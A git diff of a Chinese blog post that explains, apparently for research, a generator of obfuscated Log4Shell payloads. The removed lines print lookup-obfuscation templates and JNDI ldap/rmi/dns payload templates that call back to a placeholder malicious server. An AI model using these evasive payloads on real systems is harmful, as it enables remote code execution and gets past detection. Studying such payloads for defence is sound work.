@@ -30,183 +30,31 @@ tags:
 
 下面是初级混淆的模板：
 
-```
-# Primary Obfuscated Colon Template
-:
-${::-:}
-${lower::}
-${k8s:{{random_variable}}:-:}
-${env:{{random_variable}}:-:}
-${ctx:{{random_variable}}:-:}
-${main:{{main_argument_key}}:-:}
-${main:{{random_variable}}:-:}
-${map:{{random_variable}}:-:}
-${sd:{{random_variable}}:-:}
-${sys:{{random_variable}}:-:}
-${web:{{random_variable}}:-:}
-${docker:{{random_variable}}:-:}
-${event:{{random_variable}}:-:}
-${log4j:{{random_variable}}:-:}
-${marker:{{random_variable}}:-:}
-${spring:{{random_variable}}:-:}
-${upper::}
-${:-:}
-${{{random_lookup}}:{{random_variable}}:-:}
-```
+![初级混淆的冒号模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/primary-delimiter-obfuscated.png)
 
-```
-# Primary Obfuscated Lowercase Template
-{{lowercase}}
-${::-{{lowercase}}}
-${lower:{{lowercase}}}
-${lower:{{uppercase}}}
-${k8s:{{random_variable}}:-{{lowercase}}}
-${env:{{random_variable}}:-{{lowercase}}}
-${ctx:{{random_variable}}:-{{lowercase}}}
-${main:{{main_argument_key}}:-{{lowercase}}}
-${main:{{random_variable}}:-{{lowercase}}}
-${map:{{random_variable}}:-{{lowercase}}}
-${sd:{{random_variable}}:-{{lowercase}}}
-${sys:{{random_variable}}:-{{lowercase}}}
-${web:{{random_variable}}:-{{lowercase}}}
-${docker:{{random_variable}}:-{{lowercase}}}
-${event:{{random_variable}}:-{{lowercase}}}
-${log4j:{{random_variable}}:-{{lowercase}}}
-${marker:{{random_variable}}:-{{lowercase}}}
-${spring:{{random_variable}}:-{{lowercase}}}
-${:-{{lowercase}}}
-${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
-```
+![初级混淆的小写字母模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/primary-lower-case-obfuscated.png)
 
-```
-# Primary Obfuscated Uppercase Template
-{{uppercase}}
-${::-{{uppercase}}}
-${k8s:{{random_variable}}:-{{uppercase}}}
-${env:{{random_variable}}:-{{uppercase}}}
-${ctx:{{random_variable}}:-{{uppercase}}}
-${main:{{main_argument_key}}:-{{uppercase}}}
-${main:{{random_variable}}:-{{uppercase}}}
-${map:{{random_variable}}:-{{uppercase}}}
-${sd:{{random_variable}}:-{{uppercase}}}
-${sys:{{random_variable}}:-{{uppercase}}}
-${web:{{random_variable}}:-{{uppercase}}}
-${docker:{{random_variable}}:-{{uppercase}}}
-${event:{{random_variable}}:-{{uppercase}}}
-${log4j:{{random_variable}}:-{{uppercase}}}
-${marker:{{random_variable}}:-{{uppercase}}}
-${spring:{{random_variable}}:-{{uppercase}}}
-${upper:{{uppercase}}}
-${upper:{{lowercase}}}
-${:-{{uppercase}}}
-${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
-```
+![初级混淆的大写字母模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/primary-upper-case-obfuscated.png)
 
 模板中出现了大小写字母，随机变量名，Main Arguments Lookup的键的索引形式，不存在的Lookup的占位符。
 
 下面是二次混淆的模板：
 
-```
-# Secondary Obfuscated Colon Template
-:
-${::-:}
-${{{l_lookup}}{{o_lookup}}{{w_lookup}}{{e_lookup}}{{r_lookup}}::}
-${{{k_lookup}}{{8_lookup}}{{s_lookup}}:{{random_variable}}:-:}
-${{{e_lookup}}{{n_lookup}}{{v_lookup}}:{{random_variable}}:-:}
-${{{c_lookup}}{{t_lookup}}{{x_lookup}}:{{random_variable}}:-:}
-${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{main_argument_key}}:-:}
-${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{random_variable}}:-:}
-${{{m_lookup}}{{a_lookup}}{{p_lookup}}:{{random_variable}}:-:}
-${{{s_lookup}}{{d_lookup}}:{{random_variable}}:-:}
-${{{s_lookup}}{{y_lookup}}{{s_lookup}}:{{random_variable}}:-:}
-${{{w_lookup}}{{e_lookup}}{{b_lookup}}:{{random_variable}}:-:}
-${{{d_lookup}}{{o_lookup}}{{c_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-:}
-${{{e_lookup}}{{v_lookup}}{{e_lookup}}{{n_lookup}}{{t_lookup}}:{{random_variable}}:-:}
-${{{l_lookup}}{{o_lookup}}{{g_lookup}}{{4_lookup}}{{j_lookup}}:{{random_variable}}:-:}
-${{{m_lookup}}{{a_lookup}}{{r_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-:}
-${{{s_lookup}}{{p_lookup}}{{r_lookup}}{{i_lookup}}{{n_lookup}}{{g_lookup}}:{{random_variable}}:-:}
-${{{u_lookup}}{{p_lookup}}{{p_lookup}}{{e_lookup}}{{r_lookup}}::}
-${:-:}
-${{{random_lookup}}:{{random_variable}}:-:}
-```
+![二次混淆的冒号模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/secondary-delimiter-obfuscated.png)
 
-```
-# Unprefixed Lookup template that replaces the Lookup prefix
-${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
-${:-{{uppercase}}}
-${:-{{lowercase}}}
-${::-{{uppercase}}}
-${::-{{lowercase}}}
-{{uppercase}}
-{{lowercase}}
-```
+![无前缀Lookup模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/lookup-prefix-char-obfuscated.png)
 
 模板中占位符的作用是对可用的Lookups的前缀利用无前缀的Lookups进行等效替换。
 
-```
-# Secondary Obfuscated Lowercase Template
-{{lowercase}}
-${::-{{lowercase}}}
-${{{l_lookup}}{{o_lookup}}{{w_lookup}}{{e_lookup}}{{r_lookup}}:{{lowercase}}}
-${{{l_lookup}}{{o_lookup}}{{w_lookup}}{{e_lookup}}{{r_lookup}}:{{uppercase}}}
-${{{k_lookup}}{{8_lookup}}{{s_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{e_lookup}}{{n_lookup}}{{v_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{c_lookup}}{{t_lookup}}{{x_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{main_argument_key}}:-{{lowercase}}}
-${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{m_lookup}}{{a_lookup}}{{p_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{s_lookup}}{{d_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{s_lookup}}{{y_lookup}}{{s_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{w_lookup}}{{e_lookup}}{{b_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{d_lookup}}{{o_lookup}}{{c_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{e_lookup}}{{v_lookup}}{{e_lookup}}{{n_lookup}}{{t_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{l_lookup}}{{o_lookup}}{{g_lookup}}{{4_lookup}}{{j_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{m_lookup}}{{a_lookup}}{{r_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{lowercase}}}
-${{{s_lookup}}{{p_lookup}}{{r_lookup}}{{i_lookup}}{{n_lookup}}{{g_lookup}}:{{random_variable}}:-{{lowercase}}}
-${:-{{lowercase}}}
-${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
-```
+![二次混淆的小写字母模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/secondary-lower-case-obfuscated.png)
 
-```
-# Secondary Obfuscated Uppercase Template
-{{uppercase}}
-${::-{{uppercase}}}
-${{{k_lookup}}{{8_lookup}}{{s_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{e_lookup}}{{n_lookup}}{{v_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{c_lookup}}{{t_lookup}}{{x_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{main_argument_key}}:-{{uppercase}}}
-${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{m_lookup}}{{a_lookup}}{{p_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{s_lookup}}{{d_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{s_lookup}}{{y_lookup}}{{s_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{w_lookup}}{{e_lookup}}{{b_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{d_lookup}}{{o_lookup}}{{c_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{e_lookup}}{{v_lookup}}{{e_lookup}}{{n_lookup}}{{t_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{l_lookup}}{{o_lookup}}{{g_lookup}}{{4_lookup}}{{j_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{m_lookup}}{{a_lookup}}{{r_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{s_lookup}}{{p_lookup}}{{r_lookup}}{{i_lookup}}{{n_lookup}}{{g_lookup}}:{{random_variable}}:-{{uppercase}}}
-${{{u_lookup}}{{p_lookup}}{{p_lookup}}{{e_lookup}}{{r_lookup}}:{{uppercase}}}
-${{{u_lookup}}{{p_lookup}}{{p_lookup}}{{e_lookup}}{{r_lookup}}:{{lowercase}}}
-${:-{{uppercase}}}
-${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
-```
+![二次混淆的大写字母模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/secondary-upper-case-obfuscated.png)
 
 下面是CVE-2021-44228和CVE-2021-45046 payloads的模板：
 
-```
-# CVE-2021-44228 payloads template
-${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}/{{random}}}
-${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}}
-${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{r_proto}}{{m_proto}}{{i_proto}}{{colon}}//{{callback_host}}/{{random}}}
-${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{d_proto}}{{n_proto}}{{s_proto}}{{colon}}//{{callback_host}}/{{random}}}
-```
+![CVE-2021-44228模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/CVE-2021-44228.png)
 
-```
-# CVE-2021-45046 payloads template
-${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//127.0.0.1#{{callback_host}}:1389/{{random}}}
-${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//127.0.0.1#{{callback_host}}/{{random}}}
-```
+![CVE-2021-45046模板](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/CVE-2021-45046.png)
 
 模板中出现的占位符将分别用于替换ldap、rmi、dns协议字段部分，冒号，恶意服务器的地址和随机字符串。
 
@@ -215,7 +63,7 @@ ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}
 
 payload的模式schema由三个部分part组成，它们分别是lookups部分，proto部分和delititer部分。其中lookups部分有jndi前缀，proto部分有rmi，dns和ldap前缀。delimiter部分有colon_component前缀。schema看起来像是一个树状结构。
 
-![schema的树状结构](/img/in-post/research/schema结构.jpg)
+![schema的树状结构](/img/in-post/research/Log4Shell-obfuscated-payloads-generator/schema结构.jpg)
 
 schema_one和schema_secondary在结构上完全相同。不同之处在于schema_one用于保存字符的初级混淆，schema_secondary用于保存字符的二次混淆。
 mapping_of_placeholders_to_one_obfuscated_characters是占位符到初级混淆的字符的映射。mapping_of_the_secondary_obfuscation_lookup_placeholder_to_character是用于二次混淆的lookup部分的占位符到字符的映射。方法generate_obfuscated_payloads会遍历映射，将payload模板中的占位符依次替换为对应的混淆后的字符。
